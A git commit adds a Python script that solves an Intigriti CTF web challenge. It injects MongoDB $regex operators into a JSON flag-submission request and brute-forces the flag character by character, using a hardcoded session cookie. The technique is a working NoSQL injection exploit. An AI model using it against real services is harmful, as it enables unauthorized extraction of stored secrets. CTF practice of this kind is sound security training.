2b170fd63765cb5e7bf0a2e5f86c16c318ab82db
SAIKAT KARMAKAR <saikickkarma@gmail.com>
2023-11-20 19:38:18 +0000

    first commit

---
+++ web/CTFC/get_flag.py
@@ -0,0 +1,35 @@
+#!/usr/bin/python3
+
+import requests
+import string
+
+alphabets = characters = (
+    string.ascii_lowercase + string.ascii_uppercase + string.digits + '_@{}-/()!"%=:;'
+)
+
+url = "https://ctfc.ctf.intigriti.io/"
+
+s = requests.Session()
+
+headers = {"Cookie": "session=eyJ1c2VyIjp7Il9pZCI6IjQzNTIwNmVmMGIwNDQwZjRhZmZhNDkzMWFkOTYyNjIwIiwidXNlcm5hbWUiOiJqYWR1In19.ZVuvVw.3VRTUYhJ9er-H_V7UErhXjGMAx4"}
+
+# payload = {"_id": "_id:3", "challenge_flag": {"$regex": "^INTIGRITI{"}}
+
+
+flag = "INTIGRITI{"
+
+while True:
+	for char in alphabets:
+		payload = {"_id": "_id:3", "challenge_flag": {"$regex": f"^{flag + char}"}}
+		resp = s.post(url + "/submit_flag", json=payload, headers=headers)
+
+		if "correct flag!" in resp.text:
+			print(f"[*]Flag: {flag}", flush=True)
+			flag += char
+		if flag.endswith('}'):
+			break
+	else:
+		continue
+	break
+
+print(f"[*]Flag: {flag}")
